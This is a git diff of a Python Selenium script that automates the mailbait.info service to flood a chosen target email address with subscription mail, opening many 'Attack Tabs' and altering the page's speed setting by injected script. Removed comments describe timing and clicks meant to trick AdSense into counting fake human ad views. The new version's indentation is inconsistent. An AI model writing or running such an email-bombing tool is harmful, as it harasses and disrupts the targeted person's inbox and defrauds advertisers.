@@ -2,39 +2,44 @@ from selenium import webdriver
 import time
 from random import randint
 
-email = input('Please enter target email address: ')
-driver = webdriver.Chrome() 
-url = "https://mailbait.info/run.html"
+def launch():
+	email = input('Please enter target email address: ')
+	windows = int(input('How many Windows of 10 Attack Tabs would you like to open? '))
+	
+	print(f'Attack Tabs will be opened sequentially until 10 per window are reached for a total of {windows * 10} attack tabs over 50 seconds.')
+	time.sleep(5)
+	print('Starting attack in 5 seconds')
+	time.sleep(5)
+	
+	url = "https://mailbait.info/run.html"
+	driver = webdriver.Chrome('/home/codeshaman/Desktop/chromedriver')
+	for i in range(windows):
+	    driver.switch_to.window(driver.window_handles[-1])
+	    driver.get(url)
+	    driver.execute_script('document.querySelector("#speed > option").value = -11000')
 
-print(10*"-")
-print('Creating 10 Attack Tabs per script: ')
-print(10*"-")
+	    text_box = driver.find_element_by_id('.mbe')
 
-for i in range(10):
-    driver.switch_to.window(driver.window_handles[-1])
-    driver.get(url)
-    driver.execute_script('document.querySelector("#speed > option").value = -11000')
+	    text_box.send_keys(email)
 
-    text_box = driver.find_element_by_id('.mbe')
+	    categories_check = driver.find_element_by_id('categories1')
 
-    text_box.send_keys(email)
+	    run = driver.find_element_by_id('runt')
+	    run.click()
 
-    categories_check = driver.find_element_by_id('categories1')
+	    categories_check.click()
+	    print(f'The current tab is: {i + 1}')
+	    
+	    print('Sleeping for 300 seconds...')
+	    time.sleep(300)  
 
-    run = driver.find_element_by_id('runt')
-    run.click()
+	    driver.execute_script("window.open('https://mailbait.info/run.html');")
+
+    print(10*"-")
+    print('Browser Window of 10 Attack Tabs at Full Speed = Complete')
+    print(10*"-")
     
-    print(f'The current tab is: {i + 1}')
-    categories_check.click() # This helps simulate a human user for adsense and moves the Categories out of the way so you can see the flow rate.
-    
-    print('Sleeping for 300 seconds...')
-    time.sleep(300) # This dwell time is important to trick adsense into thinking a human user is watching ads on mailbait.info.
+	driver.close()
+    	
 
-    driver.execute_script("window.open('https://mailbait.info/run.html');")
-    
-driver.close()
-
-print(10*"-")
-print('Browser Window of 10 Attack Tabs at Full Speed = Complete')
-print('Check your Network tab or similar in your browser to watch forms being filled at lightspeed')
-print(10*"-")
+launch()
